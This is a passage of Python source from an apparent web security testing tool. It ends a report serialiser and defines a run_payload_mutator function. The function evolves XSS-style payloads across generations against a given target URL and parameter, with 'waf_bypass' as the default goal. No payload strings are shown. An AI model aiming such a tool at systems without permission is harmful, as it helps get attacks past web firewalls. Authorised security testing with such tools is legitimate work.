        "best_fitness": round(report.best_fitness, 4),
        "fitness_history": report.fitness_history,
        "waf_vendor_hint": report.waf_vendor_hint,
        "duration_seconds": report.duration_seconds,
        "total_findings": len(report.all_findings),
        "best_payload": payload_to_dict(report.best_payload) if report.best_payload else None,
        "findings": [payload_to_dict(p) for p in report.all_findings],
        "generations": [gen_to_dict(g) for g in report.generations],
    }


def run_payload_mutator(
    target_url: str,
    param: str,
    category: str = "xss",
    evolution_target: str = "waf_bypass",
    generations: int = 5,
    population_size: int = 10,
    concurrency: int = 6,
    delay: float = 0.1,
    method: str = "GET",
    waf_vendor: str = "",
    seed_payloads: Optional[list[str]] = None,
) -> dict:
    try:
        cat = PayloadCategory(category)
    except ValueError:
        cat = PayloadCategory.XSS
    try:
        evo = EvolutionTarget(evolution_target)
    except ValueError:
        evo = EvolutionTarget.WAF_BYPASS

    mutator = PayloadMutator(
        category=cat,
        evolution_target=evo,
        generations=generations,
        population_size=population_size,
        concurrency=concurrency,
        delay=delay,
        method=method,
        waf_vendor=waf_vendor,
        seed_payloads=seed_payloads,
    )
    report = mutator.run_sync(target_url, param)
    return serialize_report(report)